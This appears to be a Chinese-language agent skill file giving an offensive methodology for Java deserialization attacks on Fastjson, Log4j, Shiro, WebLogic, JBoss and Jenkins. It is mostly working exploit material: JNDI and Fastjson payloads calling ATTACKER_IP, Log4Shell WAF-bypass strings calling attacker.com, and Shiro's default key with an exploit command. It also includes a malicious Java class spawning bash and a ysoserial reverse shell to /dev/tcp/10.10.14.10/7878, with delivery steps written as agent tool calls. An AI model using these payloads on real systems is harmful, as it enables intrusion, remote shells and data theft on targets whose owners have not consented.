# java-deserialization-methodology

> 来源: wgpsec/AboutSecurity (web-method) | 融合进 skill-web


# Java 反序列化漏洞方法论

Java 反序列化是 Java 生态中最危险的漏洞类之一——一旦成功通常直接 RCE。

## ⛔ 深入参考（必读）

- 需要 ysoserial gadget chain 优先级表、URLDNS 检测、payload 构造 → [references/ysoserial-gadgets.md](references/ysoserial-gadgets.md)
- 需要 JNDI 注入、Fastjson 版本 payload、Shiro/WebLogic/JBoss/Jenkins 专项 → [references/jndi-fastjson.md](references/jndi-fastjson.md)

---

## Phase 1: 识别 Java 反序列化入口

### 1.1 原生 Java 序列化数据（魔术字节）
- 二进制：`\xac\xed\x00\x05`（hex: `aced0005`）
- Base64 编码后：以 `rO0AB` 开头
- Gzip 压缩后再 Base64：以 `H4sIAAAA` 开头

**检查位置**：Cookie（`rememberMe`/`VIEWSTATE`）、POST Body、自定义 Header、WebSocket、RMI/T3/IIOP 协议端口

### 1.2 JSON 反序列化（Fastjson/Jackson）
- Fastjson：JSON 中含 `@type` 字段 → [references/jndi-fastjson.md](references/jndi-fastjson.md)
- Jackson：启用了 `DefaultTyping` → JSON 中含类名数组 `["com.xxx.Class", {...}]`
- 识别：发送畸形 JSON 观察错误堆栈中的库名

### 1.3 特定中间件端口

| 端口 | 服务 | 漏洞方向 |
|------|------|----------|
| 7001/7002 | WebLogic | T3/IIOP 反序列化 |
| 8009 | AJP (Tomcat) | GhostCat (CVE-2020-1938) |
| 1099 | RMI Registry | RMI 反序列化 |
| 1090/8500 | JBoss JMX | JMXInvokerServlet |
| 50000 | Jenkins | Jenkins CLI 反序列化 |

## Phase 2: 利用决策树

```
发现序列化入口
├─ 原生序列化 (rO0AB/aced0005)?
│   ├─ 先 URLDNS 确认漏洞存在 → [references/ysoserial-gadgets.md](references/ysoserial-gadgets.md)
│   └─ 逐个尝试 CC1-7 → CommonsBeanutils → Spring → Groovy
├─ Fastjson (@type 字段)?
│   └─ 识别版本 → 选择对应 payload → [references/jndi-fastjson.md](references/jndi-fastjson.md)
├─ Shiro (rememberMe=deleteMe)?
│   └─ 默认密钥 kPH+bIxk5D2deZiIxcaaaA== → [references/jndi-fastjson.md](references/jndi-fastjson.md)
└─ Log4j (Java 应用 + 用户输入)?
    └─ ${jndi:ldap://...} → [references/jndi-fastjson.md](references/jndi-fastjson.md)
```

## 注意事项
- **先用 URLDNS 检测**，确认漏洞存在后再尝试命令执行 gadget
- ysoserial 的 `Runtime.exec()` 不支持管道/重定向，需要 Base64 编码命令
- Java 版本影响 JNDI 利用方式（JDK < 8u191 最简单，8u191+ 需本地 Gadget）
- 多个 gadget chain 逐一尝试，不同 classpath 环境适用不同 gadget


---

## REF: jndi-fastjson

# JNDI 注入、Fastjson、中间件专项

## JNDI 注入利用

JNDI 注入通过让目标服务器访问攻击者控制的 LDAP/RMI 服务来加载恶意类。

### 启动恶意 LDAP/RMI 服务
```
java -jar JNDIExploit.jar -i ATTACKER_IP -p 8888 -l 1389
```
同时监听 LDAP(1389) 和 HTTP(8888)。

### 触发 JNDI Lookup

**Log4j (CVE-2021-44228)**：
在任何用户输入中注入（Header/参数/User-Agent）：
```
${jndi:ldap://ATTACKER_IP:1389/Basic/Command/cat /flag.txt}
```

**Fastjson**：
```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://ATTACKER_IP:1389/Exploit","autoCommit":true}
```

### JDK 版本对 JNDI 的影响
- **JDK < 8u191**：LDAP + 远程 codebase 直接加载恶意类（最简单）
- **JDK 8u191+**：`trustURLCodebase=false`，需要用本地 Gadget（BeanFactory + ELProcessor）
- **JDK 11+**：更多限制，可能需要 serialized gadget 替代 Reference

JNDIExploit 工具通常已经内置了各版本的绕过方式。

## Fastjson 专项

### 版本识别
发送畸形 JSON 触发报错：
```json
{"a":"\\x00"}
```
错误信息通常包含 Fastjson 版本号。

### 按版本选择 Payload
- **1.2.24 及以下**：直接使用 JdbcRowSetImpl（最经典）
- **1.2.25-1.2.47**：AutoType 绕过（使用 L 和 ; 绕过黑名单）
- **1.2.48-1.2.68**：expectClass 绕过
- **1.2.69+**：safeMode，几乎无法利用

### Payload 示例（≤1.2.24）
```json
{
  "@type":"com.sun.rowset.JdbcRowSetImpl",
  "dataSourceName":"ldap://ATTACKER_IP:1389/Exploit",
  "autoCommit":true
}
```

## 常见中间件专项

### Shiro rememberMe（CVE-2016-4437 等）
1. 识别：响应 `Set-Cookie: rememberMe=deleteMe`（即使登录失败也会返回）
2. 默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`（大量 Shiro 使用默认密钥）
3. 利用：AES-CBC 加密 + 序列化 payload 放入 rememberMe Cookie
```
python3 shiro_exploit.py -u http://target -k kPH+bIxk5D2deZiIxcaaaA== -g CommonsCollections2 -c 'cat /flag.txt'
```

### WebLogic T3 协议
1. 识别：`nmap -sV -p 7001 target`（T3 协议指纹）
2. CVE 清单：CVE-2015-4852, CVE-2016-0638, CVE-2017-3248, CVE-2018-2628, CVE-2019-2725, CVE-2020-2555, CVE-2020-14882
3. 利用：使用对应 CVE 的 EXP 脚本或 ysoserial

### JBoss JMXInvokerServlet
1. 识别：访问 `/invoker/JMXInvokerServlet` 返回二进制数据
2. 利用：直接发送 ysoserial payload 到该端点

### Jenkins CLI
1. 识别：`/cli` 或端口 50000
2. CVE-2017-1000353：通过 CLI 协议发送序列化数据

## 补充: GadgetProbe 黑盒枚举

在黑盒场景下用 GadgetProbe（Burp 插件）探测 classpath 中可用库。原理：序列化对象嵌入目标类名，若类存在则触发 DNS 解析，配合 Burp Collaborator 使用。也可用 Java Deserialization Scanner 自动尝试所有 gadget chain。

**白盒快速检查**：

```bash
# 搜索目标应用是否包含常见 gadget 依赖
find . -iname "*commons*collection*"
grep -R InvokerTransformer .
grep -R "ObjectInputStream" . --include="*.java"
```

## 补充: marshalsec 手动 LDAP 服务

除 JNDIExploit 外，也可使用 marshalsec 手动搭建 LDAP 跳转服务：

```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit"
```

**恶意类示例**（低版本 JDK，编译后放到 HTTP 服务器）：

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec("bash -c {echo,BASE64_PAYLOAD}|{base64,-d}|{bash,-i}");
        } catch (Exception e) { e.printStackTrace(); }
    }
}
```

```bash
javac Exploit.java -source 8 -target 8 && python3 -m http.server 8000
```

**高版本 JDK 绕过**（JDK 8u121+ `trustURLCodebase=false`）：利用 ysoserial 生成序列化 payload，通过 JNDI-Exploit-Kit 分发：

```bash
# 生成 CommonsCollections5 反弹 shell payload
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser

# 用 JNDI-Exploit-Kit 提供 LDAP 服务
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```

## 补充: Log4Shell WAF 绕过与版本修复

**WAF 绕过变体**：

```text
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attacker.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/}
${${env:X:-j}ndi${env:X:-:}${env:X:-l}dap${env:X:-:}//attacker.com/}
```

**版本修复时间线**：
- **2.15.0**：修复不完整，`127.0.0.1#attacker.com` 可绕过 allowedLdapHosts 检查
- **2.16.0**：移除 message lookup 功能，默认禁用 JNDI
- **2.17.0**：修复递归查询问题，仅在配置文件中允许有限 lookup

## 补充: 白盒审计关键词

```java
// 反序列化入口搜索模式
ObjectInputStream, readObject, readUnshare, readResolve, readExternal
XMLDecoder, XStream.fromXML
Serializable  // 实现此接口的类可被序列化
```

搜索命令：

```bash
grep -R "ObjectInputStream" . --include="*.java"
grep -R "readObject\|readResolve\|readExternal" . --include="*.java"
grep -R "XMLDecoder\|XStream" . --include="*.java"
```


---

## REF: ysoserial-gadgets

# ysoserial Gadget Chain 详解

## Gadget Chain 优先级表

按成功率排序尝试：

| Gadget | 依赖库 | 说明 |
|--------|--------|------|
| CommonsCollections1-7 | commons-collections 3.x/4.x | 最常见，优先尝试 |
| CommonsBeanutils1 | commons-beanutils | Spring 项目常有 |
| Spring1/2 | spring-core + spring-beans | Spring 应用 |
| Groovy1 | groovy | Jenkins 等使用 Groovy 的应用 |
| BeanShell1 | bsh | 较少见 |
| Jdk7u21 | JDK ≤ 7u21 | 无第三方依赖，但要求旧版 JDK |
| URLDNS | 无依赖 | **不执行命令，仅 DNS 回连——用于检测漏洞是否存在** |

## 检测阶段（先用 URLDNS 确认）

先用 URLDNS gadget 确认目标是否存在反序列化漏洞（无害，仅触发 DNS 查询）：
```
java -jar ysoserial.jar URLDNS 'http://UNIQUE_ID.dnslog.cn' | base64 -w0
```
将生成的 Base64 payload 发送到目标，然后检查 DNSLog 是否收到请求。

## 利用阶段

确认漏洞存在后，逐个尝试执行命令的 gadget：
```
java -jar ysoserial.jar CommonsCollections1 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar CommonsCollections5 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar CommonsCollections6 'cat /flag.txt' | base64 -w0
java -jar ysoserial.jar CommonsBeanutils1 'cat /flag.txt' | base64 -w0
```

## Runtime.exec() 限制

ysoserial 生成的 payload 通过 `Runtime.exec()` 执行命令，**不支持管道和重定向**。
如果需要管道/重定向，用 bash -c 包裹并 Base64 编码：
```
java -jar ysoserial.jar CommonsCollections6 'bash -c {echo,Y2F0IC9mbGFnLnR4dA==}|{base64,-d}|bash' | base64 -w0
```
其中 `Y2F0IC9mbGFnLnR4dA==` 是 `cat /flag.txt` 的 Base64。

## 发送 Payload

根据入口类型发送：
```
# Cookie 方式（如 Shiro rememberMe）
http_request url="http://target/" headers={"Cookie":"rememberMe=<base64_payload>"}

# POST Body 方式
http_request url="http://target/api" method="POST" body="<base64_payload>" headers={"Content-Type":"application/x-java-serialized-object"}

# T3 协议（WebLogic）
python3 weblogic_t3_exploit.py <target_ip> 7001 <payload_file>
```
